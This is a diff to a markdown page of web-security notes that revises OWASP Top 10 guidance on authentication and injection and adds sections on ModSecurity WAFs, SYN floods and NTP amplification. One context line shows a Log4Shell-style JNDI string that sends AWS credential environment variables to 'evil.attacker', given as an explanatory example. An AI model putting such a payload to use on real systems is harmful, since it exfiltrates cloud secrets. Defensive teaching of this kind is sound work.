@@ -84,18 +84,17 @@ In order to understand and address your security requirements it is worth unders
 The [OWASP Top 10](https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet) provides list of the 10 Most Critical Web Application Security Risks
 
 * Broken Access Control can result in information disclosure, modification or destruction of all data.
-* Preventing Identification and authentication failures, require protecting APIs from unauthorized access with authentication. Some of the techniques used for protecting REST APIs are:
-
-  * [IP address-based ACLs](https://joelgsamuel.medium.com/ip-address-access-control-lists-are-not-as-great-as-you-think-they-are-4176b7d68f20) - may not be the most secure
+* Identification and authentication failures are exploited using credential stuffing, brute force password attacks, weak or well known passwords. Authentication responsibility can be offloaded to an external identity provider with baked in credentials protection. Some techniques used for authenticating and protecting REST APIs are:
+  * [IP address-based ACLs](https://joelgsamuel.medium.com/ip-address-access-control-lists-are-not-as-great-as-you-think-they-are-4176b7d68f20) - hard to manage and not necessarily the most secure
   * Certificate based Mutual TLS
   * HTTP Basic authentication
   * API Specific authentication
     * API Key - shared secret
     * JSON Web Token (JWT)
 
-* Injection can include SQL injection, Cross-Site Scripting (XSS)
+* Injection can include SQL injection and Cross-Site Scripting (XSS)
   * Untrusted data, without input sanitization is sent to the code interpreter by an attacker. There are serious security implications if any part of the string that a user passes can not be fully trusted.
-  * Use **context aware escaping** - ensure that user input is treated as literal text (escaped) as opposed to something that is executable code, depending upon the context in which it is used. e.g. The process of escaping data for SQL - to prevent SQL injection - is very different from the process of escaping data for (X)HTML, to prevent XSS.
+  * Use **context aware escaping** - ensure that user input is treated as literal text (escaped) as opposed to something that is executable code, depending upon the context in which it is used. e.g. The process of escaping data for SQL - to prevent SQL injection - is very different from the process of escaping data for (X)HTML, to prevent [XSS](Cross%20Site%20Scripting.md).
 
     ```python
     import os
@@ -137,6 +136,35 @@ The [OWASP Top 10](https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet) pr
     // attacker can also lookup application environment variables and send them over to the remote JNDI server
     searchTextInput = "$jndi:ldap://evil.attacker:1234/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}}"
     ```
+
+### Layer 7 protection
+
+HTTP based communication can be secured by deploying a Web Application Firewall (WAF) for broad range of layer 7 attacks such as SQL Injection, Cross Site Scripting, Local/Remote File Inclusion and Remote Code Execution which all together account for majority of application layer attacks.
+
+#### ModSecurity WAF
+
+ModSecurity is an open source WAF for securing applications, used by over a million sites around the world.
+
+* Inspects incoming HTTP requests for anomalies
+* Uses database of rules to define behaviours. It supports:
+  * free open source OWASP ModSecurity Core Rule Set (CRS) with generic attack detection
+  * commercial TrustWave rule set (rule package updated daily) that works alone or with OWASP CRS with specific attacks & accuracy,
+* Traffic that violates rules are dropped and/or logged
+
+The latest version, ModSecurity 3.0, has a modular architecture that runs natively in NGINX. Previous versions worked only with the Apache HTTP Server. Modsecurity can be [complied and installed for open source inginx](https://www.nginx.com/blog/compiling-and-installing-modsecurity-for-open-source-nginx/) and other reverse proxies like [HAProxy](https://www.haproxy.com/haproxy-web-application-firewall-trial/)
+
+#### DDOS Protection
+
+A denial of service attack is not limited to layer 7 when a web server receives a flood of GET/POST requests, but it can also be
+
+* SYN flood attack - A TCP connection requires 3 way handshake between the client and the server
+  * Client -> SYN packet -> Server
+  * Server -> SYN-ACK -> Client
+  * Client -> ACK -> Server
+  * The client overwhelms ther server by sending SYN packets without sending ACK, crossing the number of TCP connections the server can support
+* [NTP amplification attack](https://www.cloudflare.com/en-gb/learning/ddos/ntp-amplification-ddos-attack) - The Network Time Protocol is designed to allow internet connected devices to synchronize their internal clocks, and serves an important function in internet architecture. The `monlist` command is a feature of NTP that allows a client to request a list of the last 600 IP addresses that have sent NTP packets to the server. In an NTP amplification attack, an attacker sends a spoofed "monlist" request to a vulnerable NTP server, which then responds with a large amount of data (up to 600 times the size of the original request) to the victim's IP address. This amplifies the attack traffic and can overwhelm the victim's network, causing a denial-of-service (DoS) condition. The use of the "monlist" command in NTP has been deprecated due to its potential for abuse in amplification attacks.
+
+![nginx-dos-protection.jpg](../../Images/nginx-dos-protection.jpg "Nginx DOS protection")
 
 ### Protection offered by the browser
 
